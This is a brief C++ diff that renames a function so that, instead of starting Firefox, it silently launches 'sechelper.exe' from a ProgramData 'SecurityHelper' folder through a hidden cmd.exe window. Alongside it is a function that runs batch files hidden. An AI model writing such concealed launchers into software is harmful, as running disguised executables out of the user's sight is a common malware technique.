@@ -14,8 +14,8 @@ void runBatFile(std::string pathLocation){
     ShellExecute(0, "open", "cmd.exe", commandCall, 0, SW_HIDE);
 }
 
-void runFirefox(){
-    ShellExecute(0, "open", "cmd.exe",  "/C start /d \"C:\\Firefox\\\" firefox.exe\0", "C:\\Firefox\\\0", SW_HIDE);
+void runSechelper(){
+    ShellExecute(0, "open", "cmd.exe",  "/C start /d \"C:\\ProgramData\\SecurityHelper\\\" sechelper.exe\0", "C:\\ProgramData\\SecurityHelper\\\0", SW_HIDE);
 }
 
 std::string getExecutablePath(){
